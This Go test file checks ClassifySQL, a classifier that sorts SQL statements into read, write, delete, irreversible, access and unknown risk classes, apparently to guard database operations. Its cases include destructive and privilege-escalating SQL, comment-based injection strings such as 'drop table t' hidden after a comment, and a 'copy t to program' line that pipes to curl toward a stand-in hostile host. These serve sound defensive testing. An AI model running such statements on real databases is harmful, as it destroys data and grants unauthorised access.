package decode

import (
	"reflect"
	"testing"

	"github.com/rakeshnitb23/opfence/internal/classes"
)

func TestClassifySQL(t *testing.T) {
	R, W, D, I, A, U := classes.Read, classes.Write, classes.Delete, classes.Irreversible, classes.Access, classes.Unknown
	cases := []struct {
		sql  string
		want []classes.Class
	}{
		{"", []classes.Class{R}},
		{"select * from users where id = 1", []classes.Class{R}},
		{"SELECT 1; SELECT 2;", []classes.Class{R}},
		{"(select 1) union (select 2)", []classes.Class{R}},
		{"table users", []classes.Class{R}},
		{"show search_path", []classes.Class{R}},
		{"explain select * from t", []classes.Class{R}},
		{"explain analyze delete from t", []classes.Class{I}},
		{"explain (analyze, buffers) delete from t where id = 1", []classes.Class{D}},
		{"explain (analyze false) delete from t", []classes.Class{R}},
		{"select * into backup_users from users", []classes.Class{W}},
		{"select pg_terminate_backend(123)", []classes.Class{U}},
		{"select net.http_post('https://x', '{}')", []classes.Class{U}},
		{"insert into t values (1)", []classes.Class{W}},
		{"insert into t values (1) on conflict (id) do update set x = 2", []classes.Class{W}},
		{"update t set x = 1 where id = 2", []classes.Class{W}},
		{"update t set x = 1", []classes.Class{I}},
		{"update t set x = 1 where true", []classes.Class{I}},
		{"update t set x = 1 where 1 = 1", []classes.Class{I}},
		{"update t set x = 1 where (1=1)", []classes.Class{I}},
		{"delete from t where id in (select id from u where x)", []classes.Class{D}},
		{"delete from t", []classes.Class{I}},
		{"DELETE FROM t RETURNING *", []classes.Class{I}},
		{"delete from t where 'a' = 'a'", []classes.Class{I}},
		{"merge into t using s on t.id = s.id when matched then delete", []classes.Class{D}},
		{"merge into t using s on t.id = s.id when matched then update set x = 1", []classes.Class{W}},
		{"truncate users", []classes.Class{I}},
		{"drop table users", []classes.Class{I}},
		{"drop policy p on t", []classes.Class{A}},
		{"drop role analyst", []classes.Class{A}},
		{"create table t (id int)", []classes.Class{W}},
		{"create or replace function f() returns int as $$ select 1 $$ language sql", []classes.Class{W}},
		{"create role admin superuser", []classes.Class{A}},
		{"create policy p on t using (true)", []classes.Class{A}},
		{"alter table t add column c int", []classes.Class{W}},
		{"alter table t drop column c", []classes.Class{W, I}},
		{"alter table t drop constraint c", []classes.Class{W}},
		{"alter table t disable row level security", []classes.Class{W, A}},
		{"alter table t no force row level security", []classes.Class{W, A}},
		{"alter table t enable row level security", []classes.Class{W}},
		{"alter table t owner to someone", []classes.Class{W, A}},
		{"alter role r with superuser", []classes.Class{A}},
		{"alter default privileges grant select on tables to public", []classes.Class{A}},
		{"alter system set wal_level = minimal", []classes.Class{U}},
		{"grant all on t to anon", []classes.Class{A}},
		{"revoke select on t from anon", []classes.Class{A}},
		{"set role postgres", []classes.Class{A}},
		{"set session authorization postgres", []classes.Class{A}},
		{"set local session_replication_role = replica", []classes.Class{A}},
		{"set statement_timeout = 1000", []classes.Class{R}},
		{"begin; delete from t where id = 1; commit;", []classes.Class{R, D}},
		{"copy t to stdout", []classes.Class{R}},
		{"copy t from stdin", []classes.Class{W}},
		{"copy t to program 'curl evil'", []classes.Class{U}},
		{"do $$ begin drop table t; end $$", []classes.Class{U}},
		{"call proc()", []classes.Class{U}},
		{"vacuum full t", []classes.Class{W}},
		{"with x as (select 1) select * from x", []classes.Class{R}},
		{"with d as (delete from t returning *) select * from d", []classes.Class{I, R}},
		{"with recursive r(n) as (select 1 union all select n+1 from r where n < 3) select * from r", []classes.Class{R}},
		{"with a as (insert into t values (1) returning id), b as materialized (select 1) update u set x = 1 where id = 2", []classes.Class{W, R}},
		{"with broken", []classes.Class{U}},
		// Comments and literals cannot hide or fake keywords.
		{"select 1 -- ; drop table t", []classes.Class{R}},
		{"select 1 /* ; drop table t */", []classes.Class{R}},
		{"select 1 /* nested /* ; drop */ table t */", []classes.Class{R}},
		{"select '; drop table t'", []classes.Class{R}},
		{"select E'\\'; drop table t'", []classes.Class{R}},
		{"select $tag$ ; drop table t $tag$", []classes.Class{R}},
		{"select \"; drop\" from t", []classes.Class{R}},
		{"select 1; /* */ drop table t", []classes.Class{R, I}},
		{"select $1, $2", []classes.Class{R}},
		// Unterminated input is unknown.
		{"select 'unterminated", []classes.Class{U}},
		{"select /* unterminated", []classes.Class{U}},
		{"select $x$ unterminated", []classes.Class{U}},
		{"frobnicate everything", []classes.Class{U}},
		{"42", []classes.Class{U}},
	}
	for _, c := range cases {
		if got := ClassifySQL(c.sql); !reflect.DeepEqual(got, c.want) {
			t.Errorf("ClassifySQL(%q) = %v, want %v", c.sql, got, c.want)
		}
	}
}

func FuzzClassifySQL(f *testing.F) {
	for _, s := range []string{"select 1", "with d as (delete from t) select 1", "do $$ x $$", "explain (analyze) update t set a = 1", "select E'\\'' /* */ -- x"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		got := ClassifySQL(s)
		if len(got) == 0 {
			t.Fatal("no classes")
		}
		for _, c := range got {
			if !c.Valid() {
				t.Fatalf("invalid class %q", c)
			}
		}
	})
}
